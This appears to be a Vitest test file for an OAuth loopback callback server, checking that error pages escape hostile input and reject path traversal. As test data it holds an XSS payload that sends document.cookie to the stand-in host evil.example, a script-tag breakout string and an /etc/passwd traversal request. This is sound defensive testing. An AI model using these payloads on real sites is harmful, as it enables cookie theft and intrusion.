import { afterEach, describe, expect, it } from 'vitest';
import { declinedPage, errorPage, successPage } from '../../../../src/main/auth/callback-pages';
import { startLoopbackServer, type LoopbackServer } from '../../../../src/main/auth/loopback-server';

/**
 * The callback pages render in the user's real browser, on a 127.0.0.1 origin,
 * outside the app's CSP. `error_description` is whatever the authorization
 * server put in the query string, so it is the one value on those pages that an
 * attacker who can aim a browser at our loopback port controls.
 */
const XSS = `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">`;
const BREAKOUT = `</p></main><script>alert(1)</script><p>`;

const open: LoopbackServer[] = [];
const STATE = 'state-for-escaping-tests';

afterEach(() => {
  for (const s of open.splice(0)) s.close();
});

async function start(): Promise<LoopbackServer> {
  const s = await startLoopbackServer({ state: STATE });
  open.push(s);
  return s;
}

/** Hostile input must survive only as inert text: entities, never live tags. */
function expectNoLiveMarkup(html: string): void {
  expect(html).not.toContain('<img');
  expect(html).not.toContain('<script');
  expect(html).not.toContain('</p></main>');
  expect(html).not.toMatch(/onerror\s*=\s*["']/);
  expect(html).toContain('&lt;');
}

describe('callback pages', () => {
  it('escapes a hostile detail string', () => {
    expectNoLiveMarkup(errorPage('Google refused the sign-in', XSS));
  });

  it('escapes a detail string that tries to break out of the surrounding markup', () => {
    expectNoLiveMarkup(errorPage('Google refused the sign-in', BREAKOUT));
  });

  it('escapes the heading too', () => {
    const html = errorPage(XSS, 'detail');
    expect(html).not.toContain('<img src=x');
  });

  it('embeds no script and no remote reference on any page', () => {
    for (const html of [successPage(), declinedPage(), errorPage('a', 'b')]) {
      expect(html).not.toMatch(/<script/i);
      expect(html).not.toMatch(/https?:\/\//);
    }
  });
});

describe('loopback server reflection', () => {
  it('escapes error_description before echoing it into the response body', async () => {
    const s = await start();
    const url = `${s.redirectUri}?error=invalid_scope&error_description=${encodeURIComponent(XSS)}&state=${encodeURIComponent(STATE)}`;
    const res = await fetch(url);
    expect(res.status).toBe(400);
    expectNoLiveMarkup(await res.text());
    await expect(s.code).rejects.toThrow();
  });

  it('answers a state mismatch without reflecting anything from the request', async () => {
    const s = await start();
    const res = await fetch(`${s.redirectUri}?error=x&error_description=${encodeURIComponent(XSS)}&state=wrong`);
    expect(res.status).toBe(400);
    const html = await res.text();
    // State is checked before the error branch, so the hostile string is never
    // reached at all — not merely escaped.
    expect(html).not.toContain('evil.example');
    expect(html).toContain('Security check failed');
    await expect(s.code).rejects.toThrow();
  });

  it('serves nothing but the callback path', async () => {
    const s = await start();
    const res = await fetch(`http://127.0.0.1:${s.port}/../../etc/passwd`);
    expect(res.status).toBe(404);
  });
});
